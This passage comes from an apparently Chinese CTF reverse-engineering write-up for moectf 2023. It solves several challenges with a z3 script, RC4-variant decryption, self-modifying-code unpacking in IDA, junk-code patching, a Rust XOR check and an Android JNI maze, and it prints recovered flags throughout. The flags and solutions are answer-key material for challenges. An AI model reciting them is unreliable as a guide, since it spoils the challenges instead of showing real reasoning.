v4[7]+ 373 * v4[6]+ 297 * v4[5]+ 112 * v4[4]+ 386 * v4[3]+ 90 * v4[2]+ 361 * v4[1]+ 236 * v4[0]+ 386 * v4[14]+ 73 * v4[15]+ 315 * v4[22]+ 33 * v4[23]+ 141 * v4[24]+ 129 * v4[25]+ 123 * v4[30] == 685705)s.add(367 * v4[29]+ 55 * v4[28]+ 374 * v4[27]+ 150 * v4[24]+ 350 * v4[23]+ 141 * v4[22]+ 124 * v4[21]+ 366 * v4[20]+ 230 * v4[19]+ 307 * v4[18]+ 191 * v4[17]+ 153 * v4[12]+ 383 * v4[11]+ 145 * v4[10]+ 109 * v4[9]+ 209 * v4[8]+ 158 * v4[7]+ 221 * v4[6]+ 188 * v4[5]+ 22 * v4[4]+ 146 * v4[3]+ 306 * v4[2]+ 230 * v4[1]+ 13 * v4[0]+ 287 * v4[13]+ 257 * v4[14]+ 137 * v4[15]+ 7 * v4[16]+ 52 * v4[25]+ 31 * v4[26]+ 355 * v4[30] == 557696)s.add(100 * v4[29]+ 191 * v4[28]+ 362 * v4[27]+ 55 * v4[26]+ 210 * v4[25]+ 359 * v4[24]+ 348 * v4[21]+ 83 * v4[20]+ 395 * v4[19]+ 350 * v4[16]+ 291 * v4[15]+ 220 * v4[12]+ 196 * v4[11]+ 399 * v4[8]+ 68 * v4[7]+ 84 * v4[6]+ 281 * v4[5]+ 334 * v4[4]+ 53 * v4[3]+ 399 * v4[2]+ 338 * v4[0]+ 18 * v4[1]+ 148 * v4[9]+ 21 * v4[10]+ 174 * v4[13]+ 36 * v4[14]+ 2 * v4[17]+ 41 * v4[18]+ 137 * v4[22]+ 24 * v4[23]+ 368 * v4[30] == 538535)s.add(188 * v4[29]+ (v4[26] * 2 ** 7)+ 93 * v4[25]+ 248 * v4[24]+ 83 * v4[23]+ 207 * v4[22]+ 217 * v4[19]+ 309 * v4[16]+ 16 * v4[15]+ 135 * v4[14]+ 251 * v4[13]+ 200 * v4[12]+ 49 * v4[11]+ 119 * v4[10]+ 356 * v4[9]+ 398 * v4[8]+ 303 * v4[7]+ 224 * v4[6]+ 208 * v4[5]+ 244 * v4[4]+ 209 * v4[3]+ 189 * v4[2]+ 302 * v4[1]+ 395 * v4[0]+ 314 * v4[17]+ 13 * v4[18]+ 310 * v4[20]+ 21 * v4[21]+ 67 * v4[27]+ 127 * v4[28]+ 100 * v4[30] == 580384)s.add(293 * v4[29]+ 343 * v4[28]+ 123 * v4[27]+ 387 * v4[26]+ 114 * v4[25]+ 303 * v4[24]+ 248 * v4[23]+ 258 * v4[21]+ 218 * v4[20]+ 180 * v4[19]+ 196 * v4[18]+ 398 * v4[17]+ 398 * v4[14]+ 138 * v4[9]+ 292 * v4[8]+ 38 * v4[7]+ 179 * v4[6]+ 190 * v4[5]+ 57 * v4[4]+ 358 * v4[3]+ 191 * v4[2]+ 215 * v4[1]+ 88 * v4[0]+ 22 * v4[10]+ 72 * v4[11]+ 357 * v4[12]+ 9 * v4[13]+ 389 * v4[15]+ 81 * v4[16]+ 85 * v4[30] == 529847)s.add(311 * v4[29]+ 202 * v4[28]+ 234 * v4[27]+ 272 * v4[26]+ 55 * v4[25]+ 328 * v4[24]+ 246 * v4[23]+ 362 * v4[22]+ 86 * v4[21]+ 75 * v4[20]+ 142 * v4[17]+ 244 * v4[16]+ 216 * v4[15]+ 281 * v4[14]+ 398 * v4[13]+ 322 * v4[12]+ 251 * v4[11]+ 357 * v4[8]+ 76 * v4[7]+ 292 * v4[6]+ 389 * v4[5]+ 275 * v4[4]+ 312 * v4[3]+ 200 * v4[2]+ 110 * v4[1]+ 203 * v4[0]+ 99 * v4[9]+ 21 * v4[10]+ 269 * v4[18]+ 33 * v4[19]+ 356 * v4[30] == 631652)s.add(261 * v4[29]+ 189 * v4[26]+ 55 * v4[25]+ 23 * v4[24]+ 202 * v4[23]+ 185 * v4[22]+ 182 * v4[21]+ 285 * v4[20]+ 217 * v4[17]+ 157 * v4[16]+ 232 * v4[15]+ 132 * v4[14]+ 169 * v4[13]+ 154 * v4[12]+ 121 * v4[11]+ 389 * v4[10]+ 376 * v4[9]+ 292 * v4[6]+ 225 * v4[5]+ 155 * v4[4]+ 234 * v4[3]+ 149 * v4[2]+ 241 * v4[1]+ 312 * v4[0]+ 368 * v4[7]+ 129 * v4[8]+ 226 * v4[18]+ 288 * v4[19]+ 201 * v4[27]+ 288 * v4[28]+ 69 * v4[30] == 614840)s.add(60 * v4[29]+ 118 * v4[28]+ 153 * v4[27]+ 139 * v4[26]+ 23 * v4[25]+ 279 * v4[24]+ 396 * v4[23]+ 287 * v4[22]+ 237 * v4[19]+ 266 * v4[18]+ 149 * v4[17]+ 193 * v4[16]+ 395 * v4[15]+ 97 * v4[14]+ 16 * v4[13]+ 286 * v4[12]+ 105 * v4[11]+ 88 * v4[10]+ 282 * v4[9]+ 55 * v4[8]+ 134 * v4[7]+ 114 * v4[6]+ 101 * v4[5]+ 116 * v4[4]+ 271 * v4[3]+ 186 * v4[2]+ 263 * v4[1]+ 313 * v4[0]+ 149 * v4[20]+ 129 * v4[21]+ 145 * v4[30] == 510398)s.add(385 * v4[29]+ 53 * v4[28]+ 112 * v4[27]+ 8 * v4[26]+ 232 * v4[25]+ 145 * v4[24]+ 313 * v4[23]+ 156 * v4[22]+ 321 * v4[21]+ 358 * v4[20]+ 46 * v4[19]+ 382 * v4[18]+ 144 * v4[16]+ 222 * v4[14]+ 329 * v4[13]+ 161 * v4[12]+ 335 * v4[11]+ 50 * v4[10]+ 373 * v4[9]+ 66 * v4[8]+ 44 * v4[7]+ 59 * v4[6]+ 292 * v4[5]+ 39 * v4[4]+ 53 * v4[3]+ 310 * v4[0]+ 154 * v4[1]+ 24 * v4[2]+ 396 * v4[15]+ 81 * v4[17]+ 355 * v4[30] == 558740)s.add(249 * v4[29]+ 386 * v4[28]+ 313 * v4[27]+ 74 * v4[26]+ 22 * v4[25]+ 168 * v4[24]+ 305 * v4[21]+ 358 * v4[20]+ 191 * v4[19]+ 202 * v4[18]+ 14 * v4[15]+ 114 * v4[14]+ 224 * v4[13]+ 134 * v4[12]+ 274 * v4[11]+ 372 * v4[10]+ 159 * v4[9]+ 233 * v4[8]+ 70 * v4[7]+ 287 * v4[6]+ 297 * v4[5]+ 318 * v4[4]+ 177 * v4[3]+ 173 * v4[2]+ 270 * v4[1]+ 163 * v4[0]+ 77 * v4[16]+ 25 * v4[17]+ 387 * v4[22]+ 18 * v4[23]+ 345 * v4[30] == 592365)s.add(392 * v4[29]+ 385 * v4[28]+ 302 * v4[27]+ 13 * v4[25]+ 27 * v4[24]+ 99 * v4[22]+ 343 * v4[19]+ 324 * v4[18]+ 223 * v4[17]+ 372 * v4[16]+ 261 * v4[15]+ 181 * v4[14]+ 203 * v4[13]+ 232 * v4[12]+ 305 * v4[11]+ 393 * v4[10]+ 325 * v4[9]+ 231 * v4[8]+ 92 * v4[7]+ 142 * v4[6]+ 22 * v4[5]+ 86 * v4[4]+ 264 * v4[3]+ 300 * v4[2]+ 387 * v4[1]+ 360 * v4[0]+ 225 * v4[20]+ 127 * v4[21]+ 2 * v4[23]+ 80 * v4[26]+ 268 * v4[30] == 619574)s.add(270 * v4[28]+ 370 * v4[27]+ 235 * v4[26]+ 96 * v4[22]+ 85 * v4[20]+ 150 * v4[19]+ 140 * v4[18]+ 94 * v4[17]+ 295 * v4[16]+ 19 * v4[14]+ 176 * v4[12]+ 94 * v4[11]+ 258 * v4[10]+ 302 * v4[9]+ 171 * v4[8]+ 66 * v4[7]+ 278 * v4[6]+ 193 * v4[5]+ 251 * v4[4]+ 284 * v4[3]+ 218 * v4[2]+ (v4[1] * 2 ** 6)+ 319 * v4[0]+ 125 * v4[13]+ 24 * v4[15]+ 267 * v4[21]+ 160 * v4[23]+ 111 * v4[24]+ 33 * v4[25]+ 174 * v4[29]+ 13 * v4[30] == 480557)s.add(87 * v4[28]+ 260 * v4[27]+ 326 * v4[26]+ 210 * v4[25]+ 357 * v4[24]+ 170 * v4[23]+ 315 * v4[22]+ 376 * v4[21]+ 227 * v4[20]+ 43 * v4[19]+ 358 * v4[18]+ 364 * v4[17]+ 309 * v4[16]+ 282 * v4[15]+ 286 * v4[14]+ 365 * v4[13]+ 287 * v4[12]+ 377 * v4[11]+ 74 * v4[10]+ 225 * v4[9]+ 328 * v4[6]+ 223 * v4[5]+ 120 * v4[4]+ 102 * v4[3]+ 162 * v4[2]+ 123 * v4[1]+ 196 * v4[0]+ 29 * v4[7]+ 27 * v4[8]+ 352 * v4[30] == 666967)s.add(61 * v4[29]+ 195 * v4[28]+ 125 * v4[27]+ (v4[26] * 2 ** 6)+ 260 * v4[25]+ 202 * v4[24]+ 116 * v4[23]+ 230 * v4[22]+ 326 * v4[21]+ 211 * v4[20]+ 371 * v4[19]+ 353 * v4[16]+ 124 * v4[13]+ 188 * v4[12]+ 163 * v4[11]+ 140 * v4[10]+ 51 * v4[9]+ 262 * v4[8]+ 229 * v4[7]+ 100 * v4[6]+ 113 * v4[5]+ 158 * v4[4]+ 378 * v4[3]+ 365 * v4[2]+ 207 * v4[1]+ 277 * v4[0]+ 190 * v4[14]+ 320 * v4[15]+ 347 * v4[17]+ 11 * v4[18]+ 137 * v4[30] == 590534)s.add(39 * v4[28]+ 303 * v4[27]+ 360 * v4[26]+ 157 * v4[25]+ 324 * v4[24]+ 77 * v4[23]+ 308 * v4[22]+ 313 * v4[21]+ 87 * v4[20]+ 201 * v4[19]+ 50 * v4[18]+ 60 * v4[17]+ 28 * v4[16]+ 193 * v4[15]+ 184 * v4[14]+ 205 * v4[13]+ 140 * v4[12]+ 311 * v4[11]+ 304 * v4[10]+ 35 * v4[9]+ 356 * v4[8]+ 23 * v4[5]+ 85 * v4[4]+ 156 * v4[3]+ 16 * v4[2]+ 26 * v4[1]+ 157 * v4[0]+ 150 * v4[6]+ 72 * v4[7]+ 58 * v4[29] == 429108)s.add(157 * v4[29]+ 137 * v4[28]+ 71 * v4[27]+ 269 * v4[26]+ 161 * v4[25]+ 317 * v4[20]+ 296 * v4[19]+ 385 * v4[18]+ 165 * v4[13]+ 159 * v4[12]+ 132 * v4[11]+ 296 * v4[10]+ 162 * v4[7]+ 254 * v4[4]+ 172 * v4[3]+ 132 * v4[0]+ 369 * v4[1]+ 257 * v4[2]+ 134 * v4[5]+ 384 * v4[6]+ 53 * v4[8]+ 255 * v4[9]+ 229 * v4[14]+ 129 * v4[15]+ 23 * v4[16]+ 41 * v4[17]+ 112 * v4[21]+ 17 * v4[22]+ 222 * v4[23]+ 96 * v4[24]+ 126 * v4[30] == 563521)s.add(207 * v4[29]+ 83 * v4[28]+ 111 * v4[27]+ 35 * v4[26]+ 67 * v4[25]+ 138 * v4[22]+ 223 * v4[21]+ 142 * v4[20]+ 154 * v4[19]+ 111 * v4[18]+ 341 * v4[17]+ 175 * v4[16]+ 259 * v4[15]+ 225 * v4[14]+ 26 * v4[11]+ 334 * v4[10]+ 250 * v4[7]+ 198 * v4[6]+ 279 * v4[5]+ 301 * v4[4]+ 193 * v4[3]+ 334 * v4[2]+ 134 * v4[0]+ 37 * v4[1]+ 183 * v4[8]+ 5 * v4[9]+ 270 * v4[12]+ 21 * v4[13]+ 275 * v4[23]+ 48 * v4[24]+ 163 * v4[30] == 493999)s.add(393 * v4[29]+ 176 * v4[28]+ 105 * v4[27]+ 162 * v4[26]+ 148 * v4[25]+ 281 * v4[24]+ 300 * v4[23]+ 342 * v4[18]+ 262 * v4[17]+ 152 * v4[12]+ 43 * v4[11]+ 296 * v4[10]+ 273 * v4[9]+ 75 * v4[6]+ 18 * v4[4]+ 217 * v4[2]+ 132 * v4[1]+ 112 * v4[0]+ 210 * v4[3]+ 72 * v4[5]+ 113 * v4[7]+ 40 * v4[8]+ 278 * v4[13]+ 24 * v4[14]+ 77 * v4[15]+ 11 * v4[16]+ 55 * v4[19]+ 255 * v4[20]+ 241 * v4[21]+ 13 * v4[22]+ 356 * v4[30] == 470065)s.add(369 * v4[29]+ 231 * v4[28]+ 285 * v4[25]+ 290 * v4[24]+ 297 * v4[23]+ 189 * v4[22]+ 390 * v4[21]+ 345 * v4[20]+ 153 * v4[19]+ 114 * v4[18]+ 251 * v4[17]+ 340 * v4[16]+ 44 * v4[15]+ 58 * v4[14]+ 335 * v4[13]+ 359 * v4[12]+ 392 * v4[11]+ 181 * v4[8]+ 103 * v4[7]+ 229 * v4[6]+ 175 * v4[5]+ 208 * v4[4]+ 92 * v4[3]+ 397 * v4[2]+ 349 * v4[1]+ 356 * v4[0]+ (v4[9] * 2 ** 6)+ 5 * v4[10]+ 88 * v4[26]+ 40 * v4[27]+ 295 * v4[30] == 661276)s.add(341 * v4[27]+ 40 * v4[25]+ 374 * v4[23]+ 201 * v4[22]+ 77 * v4[21]+ 215 * v4[20]+ 283 * v4[19]+ 213 * v4[18]+ 392 * v4[17]+ 224 * v4[16]+ v4[15]+ 270 * v4[12]+ 28 * v4[11]+ 75 * v4[8]+ 386 * v4[7]+ 298 * v4[6]+ 170 * v4[5]+ 287 * v4[4]+ 247 * v4[3]+ 204 * v4[2]+ 103 * v4[1]+ 21 * v4[0]+ 84 * v4[9]+ 27 * v4[10]+ 159 * v4[13]+ 192 * v4[14]+ 213 * v4[24]+ 129 * v4[26]+ 67 * v4[28]+ 27 * v4[29]+ 361 * v4[30] == 555288)s.add(106 * v4[29]+ 363 * v4[28]+ 210 * v4[27]+ 171 * v4[26]+ 289 * v4[25]+ 240 * v4[24]+ 164 * v4[23]+ 342 * v4[22]+ 391 * v4[19]+ 304 * v4[18]+ 218 * v4[17]+ 32 * v4[16]+ 350 * v4[15]+ 339 * v4[12]+ 303 * v4[11]+ 222 * v4[10]+ 298 * v4[9]+ 47 * v4[8]+ 48 * v4[6]+ 264 * v4[4]+ 113 * v4[3]+ 275 * v4[2]+ 345 * v4[1]+ 312 * v4[0]+ 171 * v4[5]+ 384 * v4[7]+ 175 * v4[13]+ 5 * v4[14]+ 113 * v4[20]+ 19 * v4[21]+ 263 * v4[30] == 637650)s.add(278 * v4[29]+ 169 * v4[28]+ 62 * v4[27]+ 119 * v4[26]+ 385 * v4[25]+ 289 * v4[24]+ 344 * v4[23]+ 45 * v4[20]+ 308 * v4[19]+ 318 * v4[18]+ 270 * v4[17]+ v4[16]+ 323 * v4[15]+ 332 * v4[14]+ 287 * v4[11]+ 170 * v4[10]+ 163 * v4[9]+ 301 * v4[8]+ 303 * v4[7]+ 23 * v4[6]+ 327 * v4[5]+ 169 * v4[3]+ 28 * v4[0]+ 365 * v4[1]+ 15 * v4[2]+ 352 * v4[12]+ 72 * v4[13]+ 140 * v4[21]+ 65 * v4[22]+ 346 * v4[30] == 572609)s.add(147 * v4[29]+ 88 * v4[28]+ 143 * v4[27]+ 237 * v4[26]+ 63 * v4[24]+ 281 * v4[22]+ 388 * v4[21]+ 142 * v4[20]+ 208 * v4[19]+ 60 * v4[18]+ 354 * v4[15]+ 88 * v4[14]+ 146 * v4[13]+ 290 * v4[12]+ 349 * v4[11]+ 43 * v4[10]+ 230 * v4[9]+ 267 * v4[6]+ 136 * v4[5]+ 383 * v4[4]+ 35 * v4[3]+ 226 * v4[2]+ 385 * v4[1]+ 238 * v4[0]+ 348 * v4[7]+ 20 * v4[8]+ 158 * v4[16]+ 21 * v4[17]+ 249 * v4[23]+ 9 * v4[25]+ 343 * v4[30] == 603481)s.add(29 * v4[29]+ 323 * v4[26]+ 159 * v4[25]+ 118 * v4[20]+ 326 * v4[19]+ 211 * v4[18]+ 225 * v4[17]+ 355 * v4[16]+ 201 * v4[15]+ 149 * v4[14]+ 296 * v4[13]+ 184 * v4[12]+ 315 * v4[11]+ 364 * v4[10]+ 142 * v4[9]+ 75 * v4[8]+ 313 * v4[7]+ 142 * v4[6]+ 396 * v4[5]+ 348 * v4[4]+ 272 * v4[3]+ 26 * v4[2]+ 206 * v4[1]+ 173 * v4[0]+ 155 * v4[21]+ 144 * v4[22]+ 366 * v4[23]+ 257 * v4[24]+ 148 * v4[27]+ 24 * v4[28]+ 253 * v4[30] == 664504)s.add(4 * v4[29]+ 305 * v4[28]+ 226 * v4[27]+ 212 * v4[26]+ 175 * v4[25]+ 93 * v4[24]+ 165 * v4[23]+ 341 * v4[20]+ 14 * v4[19]+ 394 * v4[18]+ (v4[17] * 2 ** 8)+ 252 * v4[16]+ 336 * v4[15]+ 38 * v4[14]+ 82 * v4[13]+ 155 * v4[12]+ 215 * v4[11]+ 331 * v4[10]+ 230 * v4[9]+ 241 * v4[8]+ 225 * v4[7]+ 186 * v4[4]+ 90 * v4[3]+ 50 * v4[2]+ 62 * v4[1]+ 34 * v4[0]+ 237 * v4[5]+ 11 * v4[6]+ 336 * v4[21]+ 36 * v4[22]+ 29 * v4[30] == 473092)s.add(353 * v4[29]+ 216 * v4[28]+ 252 * v4[27]+ 8 * v4[26]+ 62 * v4[25]+ 233 * v4[24]+ 254 * v4[23]+ 303 * v4[22]+ 234 * v4[21]+ 303 * v4[20]+ (v4[19] * 2 ** 8)+ 148 * v4[18]+ 324 * v4[17]+ 317 * v4[16]+ 213 * v4[15]+ 309 * v4[14]+ 28 * v4[13]+ 280 * v4[11]+ 118 * v4[10]+ 58 * v4[9]+ 50 * v4[8]+ 155 * v4[7]+ 161 * v4[6]+ (v4[5] * 2 ** 6)+ 303 * v4[4]+ 76 * v4[3]+ 43 * v4[2]+ 109 * v4[1]+ 102 * v4[0]+ 93 * v4[30] == 497492)s.add(89 * v4[29]+ 148 * v4[28]+ 82 * v4[27]+ 53 * v4[26]+ 274 * v4[25]+ 220 * v4[24]+ 202 * v4[23]+ 123 * v4[22]+ 231 * v4[21]+ 169 * v4[20]+ 278 * v4[19]+ 259 * v4[18]+ 208 * v4[17]+ 219 * v4[16]+ 371 * v4[15]+ 181 * v4[12]+ 104 * v4[11]+ 392 * v4[10]+ 285 * v4[9]+ 113 * v4[8]+ 298 * v4[7]+ 389 * v4[6]+ 322 * v4[5]+ 338 * v4[4]+ 237 * v4[3]+ 234 * v4[0]+ 261 * v4[1]+ 10 * v4[2]+ 345 * v4[13]+ 3 * v4[14]+ 361 * v4[30] == 659149)s.add(361 * v4[29]+ 359 * v4[28]+ 93 * v4[27]+ 315 * v4[26]+ 69 * v4[25]+ 137 * v4[24]+ 69 * v4[23]+ 58 * v4[22]+ 300 * v4[21]+ 371 * v4[20]+ 264 * v4[19]+ 317 * v4[18]+ 215 * v4[17]+ 155 * v4[16]+ 215 * v4[15]+ 330 * v4[14]+ 239 * v4[13]+ 212 * v4[12]+ 88 * v4[11]+ 82 * v4[10]+ 354 * v4[9]+ 85 * v4[8]+ 310 * v4[7]+ 84 * v4[6]+ 374 * v4[5]+ 380 * v4[4]+ 215 * v4[3]+ 351 * v4[2]+ 141 * v4[1]+ 115 * v4[0]+ 108 * v4[30] == 629123)if s.check() == sat: m = s.model() for v in v4: if (str(m[v]) == 'None'):continue i = m[v] print(chr(int(str(i))),end=&quot;&quot;) // i是int ref,需要转str然后转int RRRRRc41234567891011121314151617181920212223242526272829303132333435363738394041424344__int64 __fastcall sub_1400795E0(__int64 a1, __int64 a2, __int64 inputString, int a4, __int64 key, unsigned int a6){ __int64 result; // rax int i; // [rsp+24h] [rbp+4h] int j; // [rsp+24h] [rbp+4h] int v9; // [rsp+24h] [rbp+4h] int v10; // [rsp+44h] [rbp+24h] int v11; // [rsp+44h] [rbp+24h] char v12; // [rsp+64h] [rbp+44h] char v13; // [rsp+64h] [rbp+44h] int v14; // [rsp+A4h] [rbp+84h] result = sub_14007555C(&amp;unk_1401A7007); v10 = 0; v14 = 0; for ( i = 0; i &lt; 256; ++i ) { *(_BYTE *)(a1 + i) = i; *(_BYTE *)(a2 + i) = *(_BYTE *)(key + i % a6); result = (unsigned int)(i + 1); } for ( j = 0; j &lt; 256; ++j ) { v10 = (*(unsigned __int8 *)(a2 + j) + *(unsigned __int8 *)(a1 + j) + v10) % 256; v12 = *(_BYTE *)(a1 + v10); *(_BYTE *)(a1 + v10) = *(_BYTE *)(a1 + j); *(_BYTE *)(a1 + j) = v12; result = (unsigned int)(j + 1); } v9 = 0; v11 = 0; while ( a4 ) { v9 = (v9 + 1) % 256; v11 = (*(unsigned __int8 *)(a1 + v9) + v11) % 256; v13 = *(_BYTE *)(a1 + v11); *(_BYTE *)(a1 + v11) = *(_BYTE *)(a1 + v9); *(_BYTE *)(a1 + v9) = v13; *(_BYTE *)(inputString + v14++) ^= *(_BYTE *)(a1 + (*(unsigned __int8 *)(a1 + v11) + *(unsigned __int8 *)(a1 + v9)) % 256); result = (unsigned int)--a4; } return result;} 初始化数组 产生一个s盒 异或上s盒 是rc4的特征，不过不是标准的rc4，所以需要跟着逻辑写一下然后解密 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() { int a1[256], a2[256]; unsigned char a3[] = { 0x1B, 0x9B, 0xFB, 0x19, 0x06, 0x6A, 0xB5, 0x3B, 0x7C, 0xBA, 0x03, 0xF3, 0x91, 0xB8, 0xB6, 0x3D, 0x8A, 0xC1, 0x48, 0x2E, 0x50, 0x11, 0xE7, 0xC7, 0x4F, 0xB1, 0x27, 0xCF, 0xF3, 0xAE, 0x03, 0x09, 0xB2, 0x08, 0xFB, 0xDC, 0x22,0x00,0x00 }; int a4 = 38; char key[] = &quot;moectf2023&quot;; int a6 = 10; int i, j; int v9 = 0, v10 = 0, v11 = 0, v13 = 0, v14 = 0; int result = 0; for (i = 0; i &lt; 256; i++) { a1[i] = i; a2[i] = key[i % a6]; result = i + 1; } for (j = 0; j &lt; 256; j++) { v10 = (a2[j] + a1[j] + v10) % 256; int v12 = a1[v10]; a1[v10] = a1[j]; a1[j] = v12; result = j + 1; } v9 = 0; v11 = 0; while (a4) { v9 = (v9 + 1) % 256; v11 = (a1[v9] + v11) % 256; v13 = a1[v11]; a1[v11] = a1[v9]; a1[v9] = v13; a3[v14] ^= a1[(a1[v11] + a1[v9]) % 256]; v14++; a4--; } for (i = 0; i &lt; sizeof(a3); i++) { printf(&quot;%02x &quot;, a3[i]); } printf(&quot;\\n&quot;); return 0;} ascii解密拿到flag moectf{y0u_r3a11y_understand_rc4!!!!} SMCSelf-Modifying Code顾名思义，工作起来分三步，编译的时候将函数的字节码加密插入程序，然后用VirtualProtect修改内存的保护(text段修改成可写的)，然后运行解密函数将这个函数解密 查询了一下，大多数smc相关的题目有关字节码加密的操作使用异或的挺多的 123456789101112131415int __cdecl main_0(int argc, const char **argv, const char **envp){ char v4; // [esp+0h] [ebp-78h] char v5; // [esp+0h] [ebp-78h] char v6[104]; // [esp+Ch] [ebp-6Ch] BYREF sub_401087(aPlzInputYourFl, v4); sub_401023(aS, (char)v6); sub_4011E0(); if ( sub_401050(v6) ) sub_401087(aGood, v5); else sub_401087(aTryAgainPlease, v5); return 0;} 前面的是vfprint和vfscanf sub_4011E0(); return了一个 sub_401550() 12345678910111213141516int sub_401550(){ int result; // eax int i; // [esp+4h] [ebp-1Ch] DWORD flOldProtect[2]; // [esp+18h] [ebp-8h] BYREF flOldProtect[1] = -858993460; flOldProtect[0] = (DWORD)malloc(8u); result = VirtualProtect((char *)&amp;loc_4014D0 - (unsigned int)&amp;loc_4014D0 % 0x1000, 0x1000u, 0x80u, flOldProtect); for ( i = 0; i &lt; 122; ++i ) { *((_BYTE *)&amp;loc_4014D0 + i) ^= 0x66u; result = i + 1; } return result;} VirtualProtect修改了内存页的权限，可读可写可执行，并填充0xcccc初始化了，然后下面loc_4014D0 按字节异或0x66u 122次 使用ida中的script command把0x4014D0以及往后的121个字节处理一下 12for i in range(0x4014D0,0x40154a): patch_byte(i,get_wide_byte(i)^0x66) 出现了push ebp，下面的全是db,转成数组然后转code转function，注意第一个db的位置是4014D1 12345678910111213int __cdecl sub_4014D1(int a1, char *Str){ size_t i; // [esp+0h] [ebp-8h] int v4; // [esp+4h] [ebp-4h] v4 = 1; for ( i = 0; i &lt; strlen(Str); ++i ) { if ( ((unsigned __int8)(Str[i] + 57) ^ 0x39) != (unsigned __int8)byte_40A000[i] ) v4 = 0; } return v4;} 在if中是 1234void __cdecl sub_401050(int a1){ JUMPOUT(0x4014D0);} 所以只需要把byte_40A000[i]异或一遍0x39 -57然后转ascii就能拿到flag 123456flag = [0x9f, 0x91, 0xa7, 0xa5, 0x94, 0xa6, 0x8d, 0xb5, 0xa7, 0x9c, 0xa6, 0xa1, 0xbf, 0x91, 0xa4, 0x53, 0xa6, 0x53, 0xa5, 0xa3, 0x94, 0x9b, 0x91, 0x9e, 0x8f, 0x0, 0x0, 0x0]flag = [i ^ 0x39 for i in flag]flag = [i - 57 for i in flag]for i in flag: print(chr(i),end=&quot;&quot;) moectf{Self_Mod1f1cation} junk_codesub_45A9A0(Str, 18) &amp;&amp; sub_459EBF(v5, 18)中有call花指令影响ida分析，只需要patch 0x90(nop)掉ida就能正常分析了 1234567891011121314Str1 = 'hj`^oavt+pZm`h+q._'Str1 = [ord(i) + 5 for i in Str1]Str2 = [ 0x39, 0x12, 0x0E, 0x55, 0x39, 0x0C, 0x13, 0x08, 0x0D, 0x39, 0x05, 0x56, 0x02, 0x55, 0x47, 0x47, 0x47, 0x1B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]Str2 = [int(i) ^ 0x66 for i in Str2]for i in range(len(Str1)): print(chr(Str1[i]),end=&quot;&quot;)for i in range(len(Str2)): print(chr(Str2[i]),end=&quot;&quot;) RUSTcargo是rust的包管理器 cargo new project_aaaa 创建一个项目 cargo bulid 构建 cargo run 运行 https://rustwiki.org/zh-CN/book/ rust基础语法 反编译后的代码量比较多，对于容器还有一些函数的操作，会有很多类型校验，值校验的操作，所以伪代码会比较多 12345678910111213141516171819202122232425262728293031323334353637fn main() { let mut v28 = String::new(); std::io::stdin().read_line(&amp;mut v28).unwrap(); let input = v28.trim_end(); if input.len() != 30 { println!(&quot;Error: Input length must be 30 characters&quot;); std::process::exit(1); } let byte_array: Vec&lt;u8&gt; = vec![ 0xE5, 0xE7, 0xED, 0xEB, 0xFC, 0xEE, 0xF3, 0xDA, 0xFD, 0xFB, 0xFC, 0xD7, 0xFA, 0xED, 0xFE, 0xD7, 0xFF, 0xE1, 0xE4, 0xE4, 0xD7, 0xEA, 0xED, 0xD7, 0xE9, 0xFF, 0xEE, 0xFD, 0xB9, 0xF5 ]; let mut v34: Vec&lt;u8&gt; = input.chars().map(|c| c as u8).collect(); let mut v38 = true; for (i, &amp;byte) in byte_array.iter().enumerate() { if byte ^ 0x88 != v34[i] { v38 = false; break; } } if v38 { println!(&quot;Success&quot;); } else { println!(&quot;Failure&quot;); } println!(&quot;&quot;);} 大概是这样的一个逻辑 得到flag moectf{Rust_rev_will_be_awfu1} ezandroid12345678910String s = input.getText().toString(); if (s.length() != 23) { Toast.makeText(MainActivity.this.getApplicationContext(), &quot;长度不对哦&quot;, 0).show(); } else if (MainActivity.this.check(s) == 1) { Context applicationContext = MainActivity.this.getApplicationContext(); Toast.makeText(applicationContext, &quot;OK!RIGHT,flag is moectf{&quot; + s + &quot;}&quot;, 0).show(); } else { Toast.makeText(MainActivity.this.getApplicationContext(), &quot;Try to reverse the native lib!&quot;, 0).show(); } 1234567public native int check(String str);static { System.loadLibrary(&quot;ezandroid&quot;);} 根据hint去查询资料了解到jni的代码存储在lib目录下的.so文件里面，然后在调用这些函数之前分动态注册和静态注册，静态注册的话搜索一个完整路径的类名就能找到代码位置，动态注册的话在注册的位置一路找到引用反编译就能找到位置 存在jni_onload就是动态注册 12345678qword_3BF8 = sub_173C(v6, &quot;com/doctor3/ezandroid/MainActivity&quot;); if ( qword_3BF8 ) { if ( (sub_1770(v6, qword_3BF8, off_2938, 1LL) &amp; 0x80000000) != 0 ) v4 = -1; else v4 = 65540; } 这个sub_1770应该是注册的函数，off_2938应该是要找的东西 12345 ; LOAD:0000000000000168↑o ....data.rel.ro:0000000000002938 off_2938 DCQ aCheck ; DATA XREF: JNI_OnLoad+148↑o.data.rel.ro:0000000000002938 ; &quot;check&quot;.data.rel.ro:0000000000002940 DCQ aLjavaLangStrin ; &quot;(Ljava/lang/String;)I&quot;.data.rel.ro:0000000000002948 DCQ sub_17B4 能看到传参的类型 sub17B4就是check的实现 12345678910111213141516171819202122232425262728293031323334353637383940414243bool __fastcall sub_D7C(_BYTE *inputString){ _BYTE *v1; // x8 bool v3; // [xsp+14h] [xbp-1Ch] char *flag; // [xsp+18h] [xbp-18h] _BOOL4 v6; // [xsp+2Ch] [xbp-4h] flag = &amp;asc_3B50[18]; while ( 2 ) { v3 = 0; if ( *inputString ) v3 = *flag != 42; if ( v3 ) { v1 = inputString++; switch ( *v1 ) { case 'a': --flag; continue; case 'd': ++flag; continue; case 's': flag += 15; continue; case 'w': flag -= 15; continue; default: v6 = 0; break; } } else { v6 = *flag == 35; } break; } return v6;} ws应该是上下移的意思，可以知道迷宫的宽度为15 123456789******************@******#*******.******.*****...******.*****.********.*****.****.....*****.****.*********......*********************** 试了一下错了，重新看了一下，发现看的比较快 开头有个memcpy忽略了 123456strcpy( v7, &quot;******************@**************.************...****#..*****.********.*****.****.....*****.****.*********......****&quot; &quot;*******************&quot;);v5 = __strlen_chk(v7, 0x88u);__memcpy_chk(asc_3B50, v7, v5, 136LL); asc_3B50就是看错的那个迷宫的地址 12345678910******************@**************.************...****#..*****.********.*****.****.....*****.****.*********......******************* moectf{ssaassssdddddwwddddwwaa} GUI [有问题]die显示是.net 1WndClass.lpfnWndProc = sub_450CDF; 这里设置了窗口过程的函数指针，他会处理窗口相关的信息 1LRESULT __stdcall sub_45BF90(HWND hWndParent, UINT Msg, WPARAM wParam, LPARAM lParam) 